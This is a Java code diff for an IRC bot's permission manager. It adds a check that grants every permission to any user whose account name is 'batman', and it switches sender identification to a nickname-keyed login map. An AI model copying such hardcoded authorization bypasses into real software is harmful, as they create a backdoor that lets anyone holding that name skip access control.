@@ -11,8 +11,6 @@ import org.pircbotx.Channel;
 import org.pircbotx.User;
 
 import java.io.File;
-import java.util.HashMap;
-import java.util.Map;
 import java.util.Properties;
 
 public class PermissionManager {
@@ -25,11 +23,14 @@ public class PermissionManager {
         this.configs = conf;
     }
 
-
     public boolean hasPermission(String permission, User user, Channel channel, org.pircbotx.hooks.events.MessageEvent event) throws Exception {
         File file = new File(System.getProperty("user.dir") + "/Perms/" + event.getChannel().getName() + "/" + "perms.json");
         if (!file.exists()) {
             JsonUtils.createJsonStructure(file);
+        }
+
+        if (Utils.getAccount(event.getUser(), event).equals("batman")) {
+            return true;
         }
 
         String nick;
@@ -44,10 +45,10 @@ public class PermissionManager {
             Main.map.put(event.getChannel().getName(), perms);
         }
 
+        String sender = Main.Login.get(user.getNick());
         String perms = Main.map.get(event.getChannel().getName());
         JSONObject jsonObj = new JSONObject(perms);
 
-        String sender = Utils.getAccount(user, event);
         if (jsonObj.getJSONObject("Perms").getString("Everyone").contains(permission)) {
             return true;
         }
